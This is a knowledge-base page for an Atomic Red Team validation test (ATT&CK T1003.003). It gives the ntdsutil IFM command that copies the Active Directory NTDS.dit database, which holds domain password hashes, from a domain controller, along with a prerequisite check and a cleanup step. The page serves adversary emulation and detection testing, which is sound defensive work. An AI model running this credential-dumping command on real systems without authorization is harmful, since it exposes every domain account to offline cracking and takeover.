---
atomic_guid: "2364e33d-ceab-4641-8468-bfb1d7cc2723"
title: "Dump Active Directory Database with NTDSUtil"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003.003"
attack_technique_name: "OS Credential Dumping: NTDS"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.yaml"
build_date: "2026-04-27 19:12:25"
executor: "command_prompt"
aliases:
  - "2364e33d-ceab-4641-8468-bfb1d7cc2723"
  - "Dump Active Directory Database with NTDSUtil"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

This test is intended to be run on a domain Controller.

The Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability
uses the "IFM" or "Install From Media" backup functionality that allows Active Directory restoration or installation of
subsequent domain controllers without the need of network-based replication.

Upon successful completion, you will find a copy of the ntds.dit file in the C:\Windows\Temp directory.

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping#^t1003003-ntds|T1003.003: NTDS]]

## Input Arguments

### output_folder

- description: Path where resulting dump should be placed
- type: path
- default: C:\Windows\Temp\ntds_T1003

## Dependencies

Target must be a Domain Controller

### Prerequisite Check

```untitled
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType | findstr LanmanNT
```

### Get Prerequisite

```untitled
echo Sorry, Promoting this machine to a Domain Controller must be done manually
```

## Executor

- elevation_required: True
- name: command_prompt

### Command

```cmd
mkdir #{output_folder}
ntdsutil "ac i ntds" "ifm" "create full #{output_folder}" q q
```

### Cleanup

```cmd
rmdir /q /s #{output_folder} >nul 2>&1
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.yaml)
